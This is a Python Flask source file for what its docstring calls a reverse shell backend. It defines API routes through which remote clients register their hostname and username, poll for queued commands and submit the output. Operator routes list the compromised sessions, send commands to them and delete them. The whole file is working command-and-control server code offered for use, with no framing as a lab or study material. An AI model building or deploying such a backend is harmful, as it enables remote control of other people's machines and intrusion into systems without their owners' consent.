"""API routes for reverse shell backend."""
from flask import Blueprint, request, jsonify
from app.redis_client import RedisClient
import uuid
import time

api = Blueprint('api', __name__)
redis_client = RedisClient()


@api.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint."""
    redis_status = redis_client.ping()
    return jsonify({
        'status': 'ok',
        'redis': 'connected' if redis_status else 'disconnected'
    }), 200 if redis_status else 503


@api.route('/register', methods=['POST'])
def register_client():
    """Register a new reverse shell client."""
    try:
        data = request.get_json() or {}
        client_info = {
            'hostname': data.get('hostname', 'unknown'),
            'username': data.get('username', 'unknown'),
            'platform': data.get('platform', 'unknown'),
            'timestamp': str(int(time.time()))
        }
        
        session_id = str(uuid.uuid4())
        redis_client.create_session(session_id, client_info)
        
        return jsonify({
            'session_id': session_id,
            'status': 'registered'
        }), 201
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@api.route('/poll/<session_id>', methods=['GET'])
def poll_command(session_id: str):
    """Client polls for commands to execute."""
    try:
        command = redis_client.get_command_for_session(session_id)
        if command:
            return jsonify({
                'command': command,
                'status': 'command_available'
            }), 200
        else:
            return jsonify({
                'command': None,
                'status': 'no_command'
            }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@api.route('/result/<session_id>', methods=['POST'])
def submit_result(session_id: str):
    """Client submits command execution result."""
    try:
        data = request.get_json() or {}
        command = data.get('command', '')
        output = data.get('output', '')
        
        redis_client.add_command(session_id, command, output)
        
        return jsonify({
            'status': 'result_received'
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@api.route('/sessions', methods=['GET'])
def list_sessions():
    """List all active sessions."""
    try:
        session_ids = redis_client.list_sessions()
        sessions = []
        for session_id in session_ids:
            session = redis_client.get_session(session_id)
            if session:
                sessions.append({
                    'session_id': session_id,
                    'hostname': session.get('client_info', {}).get('hostname', 'unknown'),
                    'username': session.get('client_info', {}).get('username', 'unknown'),
                    'platform': session.get('client_info', {}).get('platform', 'unknown'),
                    'status': session.get('status', 'unknown'),
                    'created_at': session.get('created_at', ''),
                    'commands_count': len(session.get('commands', []))
                })
        return jsonify({'sessions': sessions}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@api.route('/sessions/<session_id>', methods=['GET'])
def get_session(session_id: str):
    """Get detailed session information."""
    try:
        session = redis_client.get_session(session_id)
        if not session:
            return jsonify({'error': 'Session not found'}), 404
        
        return jsonify({
            'session_id': session_id,
            'client_info': session.get('client_info', {}),
            'status': session.get('status', 'unknown'),
            'created_at': session.get('created_at', ''),
            'commands': session.get('commands', [])
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@api.route('/sessions/<session_id>/command', methods=['POST'])
def send_command(session_id: str):
    """Send a command to a specific session."""
    try:
        data = request.get_json() or {}
        command = data.get('command', '')
        
        if not command:
            return jsonify({'error': 'Command is required'}), 400
        
        session = redis_client.get_session(session_id)
        if not session:
            return jsonify({'error': 'Session not found'}), 404
        
        redis_client.set_command_for_session(session_id, command)
        
        return jsonify({
            'status': 'command_sent',
            'command': command
        }), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@api.route('/sessions/<session_id>', methods=['DELETE'])
def delete_session(session_id: str):
    """Delete a session."""
    try:
        if redis_client.delete_session(session_id):
            return jsonify({'status': 'deleted'}), 200
        else:
            return jsonify({'error': 'Session not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

